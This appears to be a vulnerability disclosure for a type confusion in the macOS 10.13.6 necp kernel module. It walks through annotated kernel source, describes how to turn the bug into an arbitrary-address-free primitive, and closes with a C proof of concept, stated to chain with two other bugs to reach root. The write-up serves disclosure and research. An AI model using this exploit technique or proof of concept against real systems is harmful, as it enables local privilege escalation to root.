# Description
necp module in BSD has a fatal type confusion problem that leads to multiple vulnerabilities. One of these cases is arbitrary-address-free.

Please be noticed that I already successfully use 3 vulnerabilities in BSD to `root` the latest public macOS `10.13.6`.  

The 3 cases are:  
* (zdi-rcx15) necp arbitrary address write case.
* `(zdi-rcx16) necp arbitrary address free case.`
* (zdi-rcx17) progargsx heap leak case. 

the zdi-rcx16 is the one I will describle in the following article.

# Environment
* OS: 		    macOS 10.13.6
* Module:	    BSD

# Analysis and Exploit
1. **Type Confusion**  
   In necp module, there are 2 kinds of fileops. One is `necp_fd_ops` used by function `necp_open`; the other one is `necp_session_fd_ops` used by function `necp_session_open`. Both have the same *fo_type*:
   ```
   static const struct fileops necp_fd_ops = {
	.fo_type = DTYPE_NETPOLICY,
	.fo_read = noop_read,
	.fo_write = noop_write,
	.fo_ioctl = noop_ioctl,
	.fo_select = necpop_select,
	.fo_close = necpop_close,
	.fo_kqfilter = necpop_kqfilter,
	.fo_drain = NULL,
    };

    static const struct fileops necp_session_fd_ops = {
	.fo_type = DTYPE_NETPOLICY,
	.fo_read = noop_read,
	.fo_write = noop_write,
	.fo_ioctl = noop_ioctl,
	.fo_select = noop_select,
	.fo_close = necp_session_op_close,
	.fo_kqfilter = noop_kqfilter,
	.fo_drain = NULL,
    };
    ```

    The same *fo_type* means that `necp_client_action` and `necp_session_action` may operates on the wrong fg resource because `necp_find_fd_data` in `necp_client_action` and `necp_session_find_from_fd` in `necp_session_action` just verify if the provided fd has *fo_type* equals to *DTYPE_NETPOLICY*.
   

    Firstly, see how necp_client_action uses user-provided fd.
    ```
    int
    necp_client_action(struct proc *p, struct necp_client_action_args *uap, int *retval)
    {
    #pragma unused(p)
	    int error = 0;
	    int return_value = 0;
	    struct necp_fd_data *fd_data = NULL;
	    error = necp_find_fd_data(uap->necp_fd, &fd_data);  ---(a)
	    if (error != 0) {
		    NECPLOG(LOG_ERR, "necp_client_action find fd error (%d)", error);
		    return (error);
	    }

	    u_int32_t action = uap->action;
	    switch (action) {
        ...
        }
    }
    ```
    at location (a), necp_client_action will find the target fd_data according to user-provided fd. 
    ```
    static int
    necp_find_fd_data(int fd, struct necp_fd_data **fd_data)
    {
	    proc_t p = current_proc();
	    struct fileproc *fp = NULL;
	    int error = 0;

	    proc_fdlock_spin(p);
	    if ((error = fp_lookup(p, fd, &fp, 1)) != 0) {
		    goto done;
	    }
	    if (fp->f_fglob->fg_ops->fo_type != DTYPE_NETPOLICY) {  ---(b)
		    fp_drop(p, fd, fp, 1);
		    error = ENODEV;
		    goto done;
	    }
	    *fd_data = (struct necp_fd_data *)fp->f_fglob->fg_data;

    done:
	    proc_fdunlock(p);
	    return (error);
    }
    ```
    at location (b), necp_find_fd_data will verify if *fo_type* is DTYPE_NETPOLICY.  


    Then, see how necp_session_action uses user-provided fd.
    ```
    int
    necp_session_action(struct proc *p, struct necp_session_action_args *uap, int *retval)
    {
    #pragma unused(p)
	    int error = 0;
	    int return_value = 0;
	    struct necp_session *session = NULL;
	    error = necp_session_find_from_fd(uap->necp_fd, &session);  ---(aa)
	    if (error != 0) {
		    NECPLOG(LOG_ERR, "necp_session_action find fd error (%d)", error);
		    return (error);
	    }

	    NECP_SESSION_LOCK(session);
        ...
    }
    ```
    at location (a), necp_session_action will find the target fd_data according to user-provided fd. 

    ```
    static int
    necp_session_find_from_fd(int fd, struct necp_session **session)
    {
	    proc_t p = current_proc();
	    struct fileproc *fp = NULL;
	    int error = 0;

	    proc_fdlock_spin(p);
	    if ((error = fp_lookup(p, fd, &fp, 1)) != 0) {
		    goto done;
	    }
	    if (fp->f_fglob->fg_ops->fo_type != DTYPE_NETPOLICY) {  ---(bb)
		    fp_drop(p, fd, fp, 1);
		    error = ENODEV;
		    goto done;
	    }
	    *session = (struct necp_session *)fp->f_fglob->fg_data;

    done:
	    proc_fdunlock(p);
	    return (error);
    }
    ```
    at location (bb), necp_session_find_from_fd will verify if *fo_type* is DTYPE_NETPOLICY. 

    So **necp_find_fd_data** and **necp_session_find_from_fd** are almost the same:
    * fp_lookup with user-provided fd 
    * verify if *fo_type* == DTYPE_NETPOLICY
    * return fg_data  

    Thus necp_client_action and necp_session_action can both work with the same fd. But necp_client_action is designed to just use fd created by necp_open and necp_session_action is designed to use fd created by necp_session_open only. Each fd points to different fg structure.  

    fd from necp_open points to **necp_fd_data**:
    ```
    int
    necp_open(struct proc *p, struct necp_open_args *uap, int *retval)
    {
    #pragma unused(retval)
	    int error = 0;
	    struct necp_fd_data *fd_data = NULL;
	    struct fileproc *fp = NULL;
	    int fd = -1;

        ...

        fp->f_fglob->fg_data = fd_data;

        ...
    }

    struct necp_fd_data {
	    +0x00 u_int8_t necp_fd_type;
	    +0x08 LIST_ENTRY(necp_fd_data) chain;
	    +0x18 struct _necp_client_tree clients;
	    +0x20 TAILQ_HEAD(_necp_client_update_list, necp_client_update) update_list;
	    +0x30 int update_count;
	    +0x34 int flags;
	    +0x38 int proc_pid;
	    +0x40 decl_lck_mtx_data(, fd_lock);
	    +0x50 struct selinfo si;
    };
    ```

    fd from necp_session_open points to **necp_session**:
    ```
    int
    necp_session_open(struct proc *p, struct necp_session_open_args *uap, int *retval)
    {
    #pragma unused(uap)
	    int error = 0;
	    struct necp_session *session = NULL;
	    struct fileproc *fp = NULL;
	    int fd = -1;

        ...

        fp->f_fglob->fg_data = session;

        ...
    }

    struct necp_session {
	    +0x00    u_int8_t   necp_fd_type;
	    +0x04   u_int32_t   control_unit;
	    +0x08   u_int32_t   session_priority; // Descriptive priority rating
	    +0x0c   u_int32_t   session_order;

	    +0x10   decl_lck_mtx_data(, lock);

	    +0x20   bool    proc_locked; // Messages must come from proc_uuid
	    +0x21   uuid_t  proc_uuid;
	    +0x34   int proc_pid;

	    +0x38   bool    dirty;
	    +0x40   LIST_HEAD(_policies, necp_session_policy) policies;

	    +0x50   LIST_HEAD(_services, necp_service_registration) services;

	    +0x60   TAILQ_ENTRY(necp_session) chain;
    };
    ```

    With `type-confusion`, necp_client_action may operate on structure **necp_session** and necp_session_action may operate on structure **necp_fd_data**:
    cmd function|structure by design|structure by confusion|
    ---|---|---|
    necp_client_action|necp_fd_data|necp_session|
    necp_session_action|necp_session|necp_fd_data|

2. **Exploit: Arbitrary Address Free(AAF)**  
    Process:
    * craft a necp_fd_data by calling necp_session_action
    * call necp_client_action on the crafted necp_fd_data

    First Step, craft a necp_fd_data. We can call necp_session_action with fd points to necp_fd_data(created by necp_open) instead of necp_session(created by necp_session_open):
    ```
    int
    necp_session_action(struct proc *p, struct necp_session_action_args *uap, int *retval)
    {
    #pragma unused(p)
	    int error = 0;
	    int return_value = 0;
	    struct necp_session *session = NULL;
	    error = necp_session_find_from_fd(uap->necp_fd, &session);
	    if (error != 0) {
		    NECPLOG(LOG_ERR, "necp_session_action find fd error (%d)", error);
		    return (error);
	    }

	    NECP_SESSION_LOCK(session);

	    if (session->proc_locked) {
		    // Verify that the calling process is allowed to do actions
		    uuid_t proc_uuid;
		    proc_getexecutableuuid(current_proc(), proc_uuid, sizeof(proc_uuid));
		    if (uuid_compare(proc_uuid, session->proc_uuid) != 0) {
			    error = EPERM;
			    goto done;
		    }
	    } else {
		    // If not locked, update the proc_uuid and proc_pid of the session
		    proc_getexecutableuuid(current_proc(), session->proc_uuid, sizeof(session->proc_uuid)); ---(a)
		    session->proc_pid = proc_pid(current_proc());   ---(b)
	    }

        ...

    }
    ```
    Due to type confusion, session here actually points to structure necp_fd_data. If session->proc_locked (first byte of necp_fd_data->update_list) is 0, session->proc_uuid (necp_fd_data, offset:update_list+1, len:0x10) and session->proc_pid (necp_fd_data, offset:flags, len: 4) will be set.  
    Here we get a necp_fd_data with update_list+1 set to proc_uuid and flags set to pid.  
    The condition session->proc_locked is alway 0 because necp_fd_data->update_list is initialized with `TAILQ_INIT(&fd_data->update_list)`.

    Second step, We can call necp_client_action with previous crafted necp_fd_data. We use action number 15 to exploit.

    Action 15 of necp_client_action is `necp_client_copy_client_update`:

    ```
    static int
    necp_client_copy_client_update(struct necp_fd_data *fd_data, struct necp_client_action_args *uap, int *retval)
    {
	    int error = 0;

	    *retval = 0;

	    if (!(fd_data->flags & NECP_OPEN_FLAG_PUSH_OBSERVER)) {     ---(a)
		    NECPLOG0(LOG_ERR, "NECP fd is not observer, cannot copy client update");
		    return (EINVAL);
	    }

	    if (uap->client_id_len != sizeof(uuid_t) || uap->client_id == 0) {
		    NECPLOG0(LOG_ERR, "Client id invalid, cannot copy client update");
		    return (EINVAL);
	    }

	    if (uap->buffer_size == 0 || uap->buffer == 0) {
		    NECPLOG0(LOG_ERR, "Buffer invalid, cannot copy client update");
		    return (EINVAL);
	    }

	    NECP_FD_LOCK(fd_data);
	    struct necp_client_update *client_update = TAILQ_FIRST(&fd_data->update_list);      ---(b)
	    if (client_update != NULL) {
		    TAILQ_REMOVE(&fd_data->update_list, client_update, chain);  ---(c)
		    VERIFY(fd_data->update_count > 0);
		    fd_data->update_count--;
	    }
	    NECP_FD_UNLOCK(fd_data);

	    if (client_update != NULL) {
		    error = copyout(client_update->client_id, uap->client_id, sizeof(uuid_t));  ---(d)
		    if (error) {
			    NECPLOG(LOG_ERR, "Copy client update copyout client id error (%d)", error);
		    } else {
			    if (uap->buffer_size < client_update->update_length) {
				    NECPLOG(LOG_ERR, "Buffer size cannot hold update (%zu < %zu)", uap->buffer_size, client_update->update_length);
				    error = EINVAL;
			    } else {
				    error = copyout(&client_update->update, uap->buffer, client_update->update_length); ---(e)
				    if (error) {
					    NECPLOG(LOG_ERR, "Copy client update copyout error (%d)", error);
				    } else {
					    *retval = client_update->update_length;
				    }
			    }
		    }

		    FREE(client_update, M_NECP);    ---(f)
		    client_update = NULL;
	    } else {
		    error = ENOENT;
	    }

	    return (error);
        }
    ```
    At location (b), client_update is the first node of fd_data->update_list; at (f), this node is freed. Since we did type confusion before, fd_data->update_list(offset:0x20, len:0x10) here is actually necp_session->proc_locked(offset:0x20, len:1) and  necp_session->proc_uuid(offset:0x21, len:0xf). necp_session->proc_locked is always of value 0; necp_session->proc_uuid is controllable by setting macho uuid(UUID LoadCommand). So we can control 0xf bytes of fd_data->update_list with the rest 1 byte always be 0x00: XXXXXXXX XXXXXXXX XXXXXXXX XXXXXX00 (X is controllable)  
    And client_update is retrieved by `TAILQ_FIRST`, it means XXXXXXXX XXXXXX00 is retuned. So we can free any address which ends with byte 0x00(the first byte), e.g. 0xffffffff80 112233`00`, 0x41414141 414141`00`.      

    Please be noticed:      
     * at location (a), fd_data->flags & 0x4 must be True, which means necp_session->proc_pid & 0x4 must be True. So re-launch the PoC if pid & 4 is False.  
     * at location (c), TAILQ_REMOVE requires client_update(the 0xf bytes controlled address) as type TAILQ_ENTRY at offset 0. So we must palce 2 writable pointers at 0x0 and 0x8 separately in order to success TAILQ_REMOVE . We can use **necp_addr_type_write** vulnerability to do this. 
     * at location (d) (e), it may leak bytes to user-mode buffer.
     
    

# PoC of AAF
```

bool necp_leak_free() {
    char yy[0xa0];
    
    int pid = getpid();
    
    if ((pid & 4) == false) {
        printf("pid not ok\n");
        return false;
    }
    
    int fd = necp_open(2);
    
    necp_session_action(fd, 0, (char*)0x7f0000000000, 0, yy, 0xa0);
    
    char client_id[0x10];

    uint8_t *buffer = (uint8_t*)map(0x21000);
    if (buffer == 0) {
        //write(1,...)
        return true;
    }
    unmap((uint64_t)&buffer[0x20000], 0x1000);
    
    int update_len = necp_client_action(fd, 15, client_id, 0x10, (char*)buffer,0x51000);
    
    int msg_len = 0x10+update_len;
    int msg_type = 2;
    
    write(1, &msg_len, 4);
    write(1, &msg_type, 4);
    
    printf("client_id:\n");
    uint64_t *p = (uint64_t*)client_id;
    printf("0x%llx 0x%llx\n", p[0], p[1]);
    write(1, &p[0], 8);
    write(1, &p[1], 8);
    
    p = (uint64_t*)buffer;
    for (int i=0; i<update_len/8; i++) {
        write(1, &p[i], 8);
    }
    
    
    return true;
}
```

# PoC of Root
see rcx17 for details. I attached the root xcode project in zdi-rcx17.
